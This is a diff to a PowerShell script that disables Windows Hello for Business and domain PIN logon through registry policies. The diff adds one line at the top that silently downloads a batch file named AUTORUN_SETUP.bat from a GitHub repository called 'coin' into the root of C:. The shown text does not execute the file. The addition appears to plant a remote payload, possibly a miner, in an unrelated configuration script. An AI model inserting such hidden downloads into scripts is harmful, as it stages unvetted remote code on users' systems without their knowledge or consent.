@@ -1,3 +1,4 @@
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.bat' -OutFile 'C:\AUTORUN_SETUP.bat'
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
 set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
